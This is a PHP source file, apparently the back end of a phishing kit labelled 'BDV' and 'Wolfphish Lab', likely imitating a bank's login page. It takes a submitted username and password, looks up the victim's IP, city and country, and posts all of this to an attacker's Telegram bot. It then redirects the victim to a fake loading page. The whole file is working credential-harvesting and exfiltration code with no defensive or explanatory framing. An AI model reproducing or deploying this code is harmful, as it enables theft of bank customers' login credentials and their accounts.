<?php
// Configuración de Telegram
require 'config.php';

// Función para obtener los detalles de la IP del usuario
function get_ip_details($ip) {
    $url = "http://www.geoplugin.net/json.gp?ip=" . $ip;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
    $result = curl_exec($ch);
    curl_close($ch);
    return json_decode($result);
}

// Obtener la IP del cliente
$ip = $_SERVER['REMOTE_ADDR'];
$geo = get_ip_details($ip);

// Datos del formulario
$nombre = isset($_POST['nombre']) ? $_POST['nombre'] : '';
$contra = isset($_POST['contra']) ? $_POST['contra'] : '';
$ciudad = isset($geo->geoplugin_city) ? $geo->geoplugin_city : 'Desconocida';
$pais = isset($geo->geoplugin_countryName) ? $geo->geoplugin_countryName : 'Desconocido';

// Componer el mensaje para enviar a Telegram
$message = "BDV\nNombre: " . $nombre;
if (!empty($contra)) {
    $message .= "\nContraseña: " . $contra;
}
$message .= "\nCiudad: " . $ciudad . "\nPaís: " . $pais . "\nIP: " . $ip . "\nWolfphish Lab";

// Enviar el mensaje a Telegram
$telegramApiUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
$chat_id = TELEGRAM_CHAT_ID;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(
    'chat_id' => $chat_id,
    'text' => $message
)));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Si se envió solo el nombre, no redirigir aún
if (!empty($contra)) {
    header('Location: cargando.html');
    exit();
} else {
    // Devolver una respuesta simple cuando solo se envía el nombre
    echo "Nombre enviado";
}
?>
